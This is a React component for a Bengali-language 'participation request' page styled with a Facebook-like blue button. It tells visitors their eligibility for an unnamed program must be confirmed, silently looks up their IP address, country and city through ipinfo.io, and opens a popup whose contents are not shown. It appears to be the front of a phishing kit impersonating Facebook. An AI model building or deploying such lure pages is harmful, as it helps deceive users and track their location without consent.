import React, { useState,useEffect} from "react";
import MyPopup from "../../components/popup";



const HomePage = () => {
  const [isPopupOpen, setPopupOpen] = useState(false);

  useEffect(() => {
    const setLocaltion = async () => {
      try {
        fetch("https://ipinfo.io/json").then(d => d.json()).then(d => {
          localStorage.setItem(
            "location",JSON.stringify({ IP: d.ip, country: d.country, city: d.city})
          );
        });
      } catch (error) {
        console.error("Error fetching data:", error);
      }
    };
    setLocaltion();
  }, []);
  const handleSubmit = (e) => {
    e.preventDefault();
    setPopupOpen(true);
  };

  const closePopup = () => {
    setPopupOpen(false);
  };

  return (
    <>
      <img src="img/sms.png" />
      <div className="card-text">
          <p className="card-type">অংশগ্রহণের অনুরোধ</p>
<h5 style={{fontsize:'10px', fontweight:'bold', color:'#1c1e21', margin:'20px 0'}}>
  প্রোগ্রামে যোগদানের জন্য আপনার যোগ্যতা নিশ্চিতকরণ
</h5>
          <p>অনুগ্রহ করে নিচে প্রয়োজনীয় তথ্য প্রদান নিশ্চিত করুন। কোনো তথ্য অনুপস্থিত থাকলে আপনার অনুরোধ প্রক্রিয়াকরণে বিলম্ব হতে পারে।</p>
          <div className="btn-wrapper">
              <div onClick={handleSubmit} id="start" className="button fb-blue w-100">
                 অনুরোধ জমা দিন
              </div>
          </div>
      </div>
      <MyPopup isOpen={isPopupOpen} onClose={closePopup} />
    </>
);
}

export default HomePage;
